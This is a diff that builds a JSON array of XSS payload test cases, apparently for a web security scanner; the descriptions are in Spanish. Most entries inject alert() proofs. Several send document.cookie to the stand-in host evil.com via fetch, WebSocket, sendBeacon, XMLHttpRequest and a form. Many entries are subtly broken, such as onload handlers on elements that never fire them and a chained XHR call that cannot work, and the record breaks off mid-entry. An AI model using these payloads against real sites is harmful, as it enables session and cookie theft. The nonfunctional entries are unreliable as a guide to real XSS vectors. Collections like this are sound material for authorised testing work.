@@ -1,12 +1,2061 @@
-{
-    "name": "Reflected XSS",
-    "description": "Inject JavaScript into reflected parameters",
+[
+  {
+    "name": "Reflected XSS - Basic Script",
+    "description": "Inyección básica de script en parámetro reflejado",
     "method": "GET",
     "endpoint": "/search",
     "headers": {
-      "Content-Type": "application/json"
+      "Content-Type": "application/x-www-form-urlencoded"
     },
     "parameters": {
       "q": "<script>alert('XSS')</script>"
     }
+  },
+  {
+    "name": "Reflected XSS - Without Script Tags",
+    "description": "XSS usando eventos HTML sin etiquetas script",
+    "method": "GET",
+    "endpoint": "/profile",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "name": "\" onmouseover=\"alert('XSS')\""
+    }
+  },
+  {
+    "name": "Stored XSS - Comment Section",
+    "description": "XSS almacenado en sección de comentarios",
+    "method": "POST",
+    "endpoint": "/comments",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "comment": "<img src=x onerror=alert('XSS')>",
+      "postId": "123"
+    }
+  },
+  {
+    "name": "DOM XSS - Document Write",
+    "description": "Manipulación del DOM usando document.write",
+    "method": "GET",
+    "endpoint": "/page",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "content": "\"><script>document.write('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS with SVG",
+    "description": "XSS usando archivos SVG maliciosos",
+    "method": "POST",
+    "endpoint": "/upload",
+    "headers": {
+      "Content-Type": "multipart/form-data"
+    },
+    "body": {
+      "file": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"/>"
+    }
+  },
+  {
+    "name": "XSS in JavaScript String",
+    "description": "Breakout de strings JavaScript",
+    "method": "GET",
+    "endpoint": "/search",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "query": "'; alert('XSS'); var foo='"
+    }
+  },
+  {
+    "name": "XSS with Base64 Encoding",
+    "description": "XSS codificado en Base64",
+    "method": "GET",
+    "endpoint": "/redirect",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "url": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+    }
+  },
+  {
+    "name": "XSS with Unicode Encoding",
+    "description": "XSS usando caracteres Unicode",
+    "method": "GET",
+    "endpoint": "/search",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "q": "\u003Cscript\u003Ealert('XSS')\u003C/script\u003E"
+    }
+  },
+  {
+    "name": "XSS with HTML Entities",
+    "description": "XSS usando entidades HTML",
+    "method": "GET",
+    "endpoint": "/search",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "q": "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
+    }
+  },
+  {
+    "name": "XSS in HTML Attributes",
+    "description": "XSS en atributos HTML",
+    "method": "GET",
+    "endpoint": "/profile",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "avatar": "javascript:alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS with Double Encoding",
+    "description": "XSS con doble encoding para bypass",
+    "method": "GET",
+    "endpoint": "/search",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "q": "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E"
+    }
+  },
+  {
+    "name": "XSS in JSON Response",
+    "description": "XSS en respuestas JSON mal renderizadas",
+    "method": "GET",
+    "endpoint": "/api/user",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1; alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS with Template Literals",
+    "description": "XSS usando template literals de JavaScript",
+    "method": "GET",
+    "endpoint": "/search",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "q": "${alert('XSS')}"
+    }
+  },
+  {
+    "name": "XSS in CSS",
+    "description": "XSS a través de estilos CSS",
+    "method": "GET",
+    "endpoint": "/theme",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "color": "red; expression(alert('XSS'))"
+    }
+  },
+  {
+    "name": "XSS with Iframe",
+    "description": "XSS usando iframes maliciosos",
+    "method": "POST",
+    "endpoint": "/post",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "content": "<iframe src=\"javascript:alert('XSS')\"></iframe>"
+    }
+  },
+  {
+    "name": "XSS in XML Data",
+    "description": "XSS en datos XML",
+    "method": "POST",
+    "endpoint": "/api/data",
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<data><name><![CDATA[<script>alert('XSS')</script>]]></name></data>"
+  },
+  {
+    "name": "XSS with Document Domain",
+    "description": "Manipulación de document.domain",
+    "method": "GET",
+    "endpoint": "/redirect",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "url": "javascript:document.domain='evil.com';alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS using eval()",
+    "description": "XSS aprovechando la función eval()",
+    "method": "GET",
+    "endpoint": "/calculator",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "expression": "alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS with setTimeout",
+    "description": "XSS usando setTimeout",
+    "method": "GET",
+    "endpoint": "/timer",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "callback": "alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS in URL Fragment",
+    "description": "XSS en fragmento de URL",
+    "method": "GET",
+    "endpoint": "/page#javascript:alert('XSS')",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "XSS with Object Tag",
+    "description": "XSS usando tag object",
+    "method": "POST",
+    "endpoint": "/upload",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "content": "<object data=\"javascript:alert('XSS')\"></object>"
+    }
+  },
+  {
+    "name": "XSS using Embed Tag",
+    "description": "XSS usando tag embed",
+    "method": "POST",
+    "endpoint": "/media",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "url": "javascript:alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS with Style Tag",
+    "description": "XSS usando tag style",
+    "method": "POST",
+    "endpoint": "/customize",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "css": "body { background: url('javascript:alert(\"XSS\")'); }"
+    }
+  },
+  {
+    "name": "XSS in HTTP Headers",
+    "description": "XSS a través de headers HTTP",
+    "method": "GET",
+    "endpoint": "/profile",
+    "headers": {
+      "User-Agent": "<script>alert('XSS')</script>",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "XSS with Cookie Manipulation",
+    "description": "XSS manipulando cookies",
+    "method": "GET",
+    "endpoint": "/auth",
+    "headers": {
+      "Cookie": "sessionid=1; username=<script>alert('XSS')</script>",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "XSS using Location Hash",
+    "description": "XSS usando location.hash",
+    "method": "GET",
+    "endpoint": "/page",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "returnUrl": "javascript:alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS with Form Action",
+    "description": "XSS en atributo action de forms",
+    "method": "POST",
+    "endpoint": "/submit",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "action": "javascript:alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS using JavaScript Protocol",
+    "description": "XSS con protocolo javascript:",
+    "method": "GET",
+    "endpoint": "/link",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "url": "javascript:alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS with Obfuscation",
+    "description": "XSS ofuscado",
+    "method": "GET",
+    "endpoint": "/search",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "q": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
+    }
+  },
+  {
+    "name": "XSS in React dangerouslySetInnerHTML",
+    "description": "XSS en React con dangerouslySetInnerHTML",
+    "method": "POST",
+    "endpoint": "/api/content",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "html": "<img src=x onerror=alert('XSS')>"
+    }
+  },
+  {
+    "name": "XSS with AngularJS Expressions",
+    "description": "XSS en expresiones de AngularJS",
+    "method": "GET",
+    "endpoint": "/app",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "name": "{{ constructor.constructor('alert(\\'XSS\\')')() }}"
+    }
+  },
+  {
+    "name": "XSS in Vue.js v-html",
+    "description": "XSS en directiva v-html de Vue.js",
+    "method": "POST",
+    "endpoint": "/api/vue",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "content": "<script>alert('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS with document.cookie",
+    "description": "XSS robando cookies",
+    "method": "GET",
+    "endpoint": "/steal",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "data": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
+    }
+  },
+  {
+    "name": "XSS using import()",
+    "description": "XSS con importación dinámica",
+    "method": "GET",
+    "endpoint": "/module",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "module": "data:text/javascript,alert('XSS')"
+    }
+  },
+  {
+    "name": "XSS with WebSocket",
+    "description": "XSS usando WebSockets",
+    "method": "GET",
+    "endpoint": "/chat",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "message": "<script>new WebSocket('ws://evil.com').send(document.cookie)</script>"
+    }
+  },
+  {
+    "name": "XSS using postMessage",
+    "description": "XSS con postMessage API",
+    "method": "GET",
+    "endpoint": "/iframe",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "url": "javascript:window.postMessage('XSS','*')"
+    }
+  },
+  {
+    "name": "XSS with localStorage",
+    "description": "XSS manipulando localStorage",
+    "method": "GET",
+    "endpoint": "/storage",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "key": "<script>localStorage.setItem('token','stolen')</script>"
+    }
+  },
+  {
+    "name": "XSS using sessionStorage",
+    "description": "XSS manipulando sessionStorage",
+    "method": "GET",
+    "endpoint": "/session",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "data": "<script>sessionStorage.setItem('user','hacked')</script>"
+    }
+  },
+  {
+    "name": "XSS with IndexedDB",
+    "description": "XSS usando IndexedDB",
+    "method": "GET",
+    "endpoint": "/db",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "query": "<script>indexedDB.open('evil')</script>"
+    }
+  },
+  {
+    "name": "XSS using Beacon API",
+    "description": "XSS con Beacon API",
+    "method": "GET",
+    "endpoint": "/analytics",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "track": "<script>navigator.sendBeacon('https://evil.com', document.cookie)</script>"
+    }
+  },
+  {
+    "name": "XSS with Fetch API",
+    "description": "XSS usando Fetch API",
+    "method": "GET",
+    "endpoint": "/api",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "url": "<script>fetch('https://evil.com/steal', {method: 'POST', body: document.cookie})</script>"
+    }
+  },
+  {
+    "name": "XSS using XMLHttpRequest",
+    "description": "XSS con XMLHttpRequest",
+    "method": "GET",
+    "endpoint": "/ajax",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "data": "<script>new XMLHttpRequest().open('POST','https://evil.com',true).send(document.cookie)</script>"
+    }
+  },
+  {
+    "name": "XSS with Form Submission",
+    "description": "XSS mediante envío de forms",
+    "method": "POST",
+    "endpoint": "/submit",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "name": "<form action=\"https://evil.com\" method=\"POST\"><input name=\"cookie\" value=\"stolen\"></form>"
+    }
+  },
+  {
+    "name": "XSS using Image Source",
+    "description": "XSS en src de imágenes",
+    "method": "POST",
+    "endpoint": "/upload",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "image": "<img src=\"javascript:alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Audio Tag",
+    "description": "XSS usando tag audio",
+    "method": "POST",
+    "endpoint": "/media",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "audio": "<audio src=\"javascript:alert('XSS')\"></audio>"
+    }
+  },
+  {
+    "name": "XSS using Video Tag",
+    "description": "XSS usando tag video",
+    "method": "POST",
+    "endpoint": "/video",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "video": "<video src=\"javascript:alert('XSS')\"></video>"
+    }
+  },
+  {
+    "name": "XSS with Source Tag",
+    "description": "XSS usando tag source",
+    "method": "POST",
+    "endpoint": "/source",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "src": "<source src=\"javascript:alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS using Track Tag",
+    "description": "XSS usando tag track",
+    "method": "POST",
+    "endpoint": "/subtitles",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "track": "<track src=\"javascript:alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Map Tag",
+    "description": "XSS usando tag map",
+    "method": "POST",
+    "endpoint": "/image-map",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "map": "<map name=\"xss\" onfocus=\"alert('XSS')\"></map>"
+    }
+  },
+  {
+    "name": "XSS using Area Tag",
+    "description": "XSS usando tag area",
+    "method": "POST",
+    "endpoint": "/hotspot",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "area": "<area shape=\"rect\" coords=\"0,0,100,100\" href=\"javascript:alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Details Tag",
+    "description": "XSS usando tag details",
+    "method": "POST",
+    "endpoint": "/content",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "details": "<details ontoggle=\"alert('XSS')\"></details>"
+    }
+  },
+  {
+    "name": "XSS using Dialog Tag",
+    "description": "XSS usando tag dialog",
+    "method": "POST",
+    "endpoint": "/modal",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "dialog": "<dialog open onclose=\"alert('XSS')\"></dialog>"
+    }
+  },
+  {
+    "name": "XSS with Menu Tag",
+    "description": "XSS usando tag menu",
+    "method": "POST",
+    "endpoint": "/menu",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "menu": "<menu onshow=\"alert('XSS')\"></menu>"
+    }
+  },
+  {
+    "name": "XSS using Marquee Tag",
+    "description": "XSS usando tag marquee",
+    "method": "POST",
+    "endpoint": "/banner",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "marquee": "<marquee onstart=\"alert('XSS')\"></marquee>"
+    }
+  },
+  {
+    "name": "XSS with Blink Tag",
+    "description": "XSS usando tag blink",
+    "method": "POST",
+    "endpoint": "/blink",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "blink": "<blink onload=\"alert('XSS')\"></blink>"
+    }
+  },
+  {
+    "name": "XSS using Keygen Tag",
+    "description": "XSS usando tag keygen",
+    "method": "POST",
+    "endpoint": "/key",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "keygen": "<keygen onkeygen=\"alert('XSS')\"></keygen>"
+    }
+  },
+  {
+    "name": "XSS with Meter Tag",
+    "description": "XSS usando tag meter",
+    "method": "POST",
+    "endpoint": "/meter",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "meter": "<meter onload=\"alert('XSS')\"></meter>"
+    }
+  },
+  {
+    "name": "XSS using Progress Tag",
+    "description": "XSS usando tag progress",
+    "method": "POST",
+    "endpoint": "/progress",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "progress": "<progress onload=\"alert('XSS')\"></progress>"
+    }
+  },
+  {
+    "name": "XSS with Output Tag",
+    "description": "XSS usando tag output",
+    "method": "POST",
+    "endpoint": "/output",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "output": "<output onload=\"alert('XSS')\"></output>"
+    }
+  },
+  {
+    "name": "XSS using Picture Tag",
+    "description": "XSS usando tag picture",
+    "method": "POST",
+    "endpoint": "/picture",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "picture": "<picture onload=\"alert('XSS')\"></picture>"
+    }
+  },
+  {
+    "name": "XSS with Template Tag",
+    "description": "XSS usando tag template",
+    "method": "POST",
+    "endpoint": "/template",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "template": "<template onload=\"alert('XSS')\"></template>"
+    }
+  },
+  {
+    "name": "XSS using Slot Tag",
+    "description": "XSS usando tag slot",
+    "method": "POST",
+    "endpoint": "/slot",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "slot": "<slot onload=\"alert('XSS')\"></slot>"
+    }
+  },
+  {
+    "name": "XSS with Canvas Tag",
+    "description": "XSS usando tag canvas",
+    "method": "POST",
+    "endpoint": "/canvas",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "canvas": "<canvas onload=\"alert('XSS')\"></canvas>"
+    }
+  },
+  {
+    "name": "XSS using Noscript Tag",
+    "description": "XSS usando tag noscript",
+    "method": "POST",
+    "endpoint": "/noscript",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "noscript": "<noscript><img src=x onerror=alert('XSS')></noscript>"
+    }
+  },
+  {
+    "name": "XSS with Meta Tag",
+    "description": "XSS usando tag meta",
+    "method": "POST",
+    "endpoint": "/meta",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "meta": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS using Link Tag",
+    "description": "XSS usando tag link",
+    "method": "POST",
+    "endpoint": "/stylesheet",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "link": "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Style Attribute",
+    "description": "XSS en atributo style",
+    "method": "POST",
+    "endpoint": "/style",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "style": "<div style=\"background:url('javascript:alert(\\'XSS\\')')\"></div>"
+    }
+  },
+  {
+    "name": "XSS using Onload Event",
+    "description": "XSS con evento onload",
+    "method": "POST",
+    "endpoint": "/load",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "element": "<body onload=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Onerror Event",
+    "description": "XSS con evento onerror",
+    "method": "POST",
+    "endpoint": "/error",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "img": "<img src=x onerror=alert('XSS')>"
+    }
+  },
+  {
+    "name": "XSS using Onclick Event",
+    "description": "XSS con evento onclick",
+    "method": "POST",
+    "endpoint": "/click",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "button": "<button onclick=\"alert('XSS')\">Click</button>"
+    }
+  },
+  {
+    "name": "XSS with Onmouseover Event",
+    "description": "XSS con evento onmouseover",
+    "method": "POST",
+    "endpoint": "/hover",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div onmouseover=\"alert('XSS')\">Hover</div>"
+    }
+  },
+  {
+    "name": "XSS using Onfocus Event",
+    "description": "XSS con evento onfocus",
+    "method": "POST",
+    "endpoint": "/focus",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input onfocus=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Onblur Event",
+    "description": "XSS con evento onblur",
+    "method": "POST",
+    "endpoint": "/blur",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input onblur=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS using Onchange Event",
+    "description": "XSS con evento onchange",
+    "method": "POST",
+    "endpoint": "/change",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "select": "<select onchange=\"alert('XSS')\"><option>1</option></select>"
+    }
+  },
+  {
+    "name": "XSS with Onsubmit Event",
+    "description": "XSS con evento onsubmit",
+    "method": "POST",
+    "endpoint": "/form",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "form": "<form onsubmit=\"alert('XSS')\"><input type=submit></form>"
+    }
+  },
+  {
+    "name": "XSS using Onkeypress Event",
+    "description": "XSS con evento onkeypress",
+    "method": "POST",
+    "endpoint": "/keypress",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input onkeypress=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Ondblclick Event",
+    "description": "XSS con evento ondblclick",
+    "method": "POST",
+    "endpoint": "/doubleclick",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div ondblclick=\"alert('XSS')\">Double Click</div>"
+    }
+  },
+  {
+    "name": "XSS using Oncontextmenu Event",
+    "description": "XSS con evento oncontextmenu",
+    "method": "POST",
+    "endpoint": "/context",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div oncontextmenu=\"alert('XSS')\">Right Click</div>"
+    }
+  },
+  {
+    "name": "XSS with Onscroll Event",
+    "description": "XSS con evento onscroll",
+    "method": "POST",
+    "endpoint": "/scroll",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div onscroll=\"alert('XSS')\" style=\"height:100px;overflow:scroll\">Scroll</div>"
+    }
+  },
+  {
+    "name": "XSS using Onresize Event",
+    "description": "XSS con evento onresize",
+    "method": "POST",
+    "endpoint": "/resize",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "iframe": "<iframe onresize=\"alert('XSS')\"></iframe>"
+    }
+  },
+  {
+    "name": "XSS with Onselect Event",
+    "description": "XSS con evento onselect",
+    "method": "POST",
+    "endpoint": "/select",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input onselect=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS using Oninput Event",
+    "description": "XSS con evento oninput",
+    "method": "POST",
+    "endpoint": "/input",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input oninput=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Onpaste Event",
+    "description": "XSS con evento onpaste",
+    "method": "POST",
+    "endpoint": "/paste",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input onpaste=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS using Oncut Event",
+    "description": "XSS con evento oncut",
+    "method": "POST",
+    "endpoint": "/cut",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input oncut=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS with Oncopy Event",
+    "description": "XSS con evento oncopy",
+    "method": "POST",
+    "endpoint": "/copy",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "input": "<input oncopy=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS using Ondrag Event",
+    "description": "XSS con evento ondrag",
+    "method": "POST",
+    "endpoint": "/drag",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div ondrag=\"alert('XSS')\" draggable=\"true\">Drag</div>"
+    }
+  },
+  {
+    "name": "XSS with Ondrop Event",
+    "description": "XSS con evento ondrop",
+    "method": "POST",
+    "endpoint": "/drop",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div ondrop=\"alert('XSS')\">Drop</div>"
+    }
+  },
+  {
+    "name": "XSS using Onwheel Event",
+    "description": "XSS con evento onwheel",
+    "method": "POST",
+    "endpoint": "/wheel",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div onwheel=\"alert('XSS')\">Wheel</div>"
+    }
+  },
+  {
+    "name": "XSS with Ontouchstart Event",
+    "description": "XSS con evento ontouchstart",
+    "method": "POST",
+    "endpoint": "/touch",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div ontouchstart=\"alert('XSS')\">Touch</div>"
+    }
+  },
+  {
+    "name": "XSS using Ontouchend Event",
+    "description": "XSS con evento ontouchend",
+    "method": "POST",
+    "endpoint": "/touchend",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div ontouchend=\"alert('XSS')\">Touch End</div>"
+    }
+  },
+  {
+    "name": "XSS with Ontouchmove Event",
+    "description": "XSS con evento ontouchmove",
+    "method": "POST",
+    "endpoint": "/touchmove",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div ontouchmove=\"alert('XSS')\">Touch Move</div>"
+    }
+  },
+  {
+    "name": "XSS using Ontouchcancel Event",
+    "description": "XSS con evento ontouchcancel",
+    "method": "POST",
+    "endpoint": "/touchcancel",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "div": "<div ontouchcancel=\"alert('XSS')\">Touch Cancel</div>"
+    }
+  },
+  {
+    "name": "XSS with Audio Context",
+    "description": "XSS usando Audio Context",
+    "method": "GET",
+    "endpoint": "/audio",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "src": "<script>new AudioContext().createOscillator().start()</script>"
+    }
+  },
+  {
+    "name": "XSS using Geolocation API",
+    "description": "XSS con Geolocation API",
+    "method": "GET",
+    "endpoint": "/location",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "track": "<script>navigator.geolocation.getCurrentPosition(function(pos){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS with Notification API",
+    "description": "XSS usando Notification API",
+    "method": "GET",
+    "endpoint": "/notify",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "message": "<script>Notification.requestPermission().then(function(){new Notification('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS using Clipboard API",
+    "description": "XSS con Clipboard API",
+    "method": "GET",
+    "endpoint": "/clipboard",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "copy": "<script>navigator.clipboard.writeText('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS with Vibration API",
+    "description": "XSS usando Vibration API",
+    "method": "GET",
+    "endpoint": "/vibrate",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "pattern": "<script>navigator.vibrate([200,100,200])</script>"
+    }
+  },
+  {
+    "name": "XSS using Battery API",
+    "description": "XSS con Battery API",
+    "method": "GET",
+    "endpoint": "/battery",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "info": "<script>navigator.getBattery().then(function(battery){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS with Device Orientation",
+    "description": "XSS usando Device Orientation",
+    "method": "GET",
+    "endpoint": "/orientation",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "sensor": "<script>window.addEventListener('deviceorientation',function(){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS using Device Motion",
+    "description": "XSS con Device Motion",
+    "method": "GET",
+    "endpoint": "/motion",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "sensor": "<script>window.addEventListener('devicemotion',function(){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS with WebRTC",
+    "description": "XSS usando WebRTC",
+    "method": "GET",
+    "endpoint": "/webrtc",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "stream": "<script>navigator.mediaDevices.getUserMedia({video:true}).then(function(){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS using WebGL",
+    "description": "XSS con WebGL",
+    "method": "GET",
+    "endpoint": "/webgl",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "render": "<script>document.createElement('canvas').getContext('webgl')</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Audio API",
+    "description": "XSS usando Web Audio API",
+    "method": "GET",
+    "endpoint": "/webaudio",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "sound": "<script>new AudioContext().createOscillator().connect(new AudioContext().destination).start()</script>"
+    }
+  },
+  {
+    "name": "XSS using Web Speech API",
+    "description": "XSS con Web Speech API",
+    "method": "GET",
+    "endpoint": "/speech",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
